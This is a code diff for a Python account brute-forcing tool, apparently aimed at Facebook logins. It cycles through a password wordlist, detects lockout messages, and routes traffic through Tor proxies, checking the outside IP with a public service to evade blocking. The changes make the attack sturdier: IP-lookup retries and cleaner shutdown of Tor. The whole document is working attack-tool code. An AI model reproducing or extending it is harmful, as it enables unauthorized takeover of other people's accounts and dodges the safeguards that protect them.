@@ -56,10 +56,8 @@ class BruteForce(object):
   try:self.brwsr.submit()
   except:pass
 
-  # Check for locks
-
   # Facebook lock
-  html = self.brwsr.response().read()
+  html=self.brwsr.response().read()
   
   if 'try again later' in html:
    self.lock=True
@@ -93,6 +91,7 @@ class BruteForce(object):
   self.ip()
   self.ipAdd=self.ipAddr()
   self.visit()
+ 
 
  # Screen Output
  def display(self,passwrd=''):
@@ -136,7 +135,12 @@ class BruteForce(object):
  def ipAddr(self):
   self.display()
   if not self.tries:print '  [-] Obtaining Proxy Ip {}...{}'.format(G,W);time.sleep(1.5)
-  return self.brwsr.open('http://icanhazip.com/').read()
+  try:
+   return self.brwsr.open('https://wtfismyip.com/text').read()
+  except:
+   self.ip()
+   self.setupBrowser()
+   self.ipAddr()  
 
  # Opens Url
  def visit(self):
@@ -300,7 +304,10 @@ if __name__ == '__main__':
   conf.config()
 
   # Bruteforce the accounts
-  BruteForce(username,wordlist,url,_username,_password).ai()
+  attack=BruteForce(username,wordlist,url,_username,_password)
+  attack.ai()
  except KeyboardInterrupt:
+  attack.alive=False
+ finally: 
   subprocess.Popen(['service','tor','stop']).wait()
   exit('\n\n{1}Exiting {0}...{1}'.format(R,W))
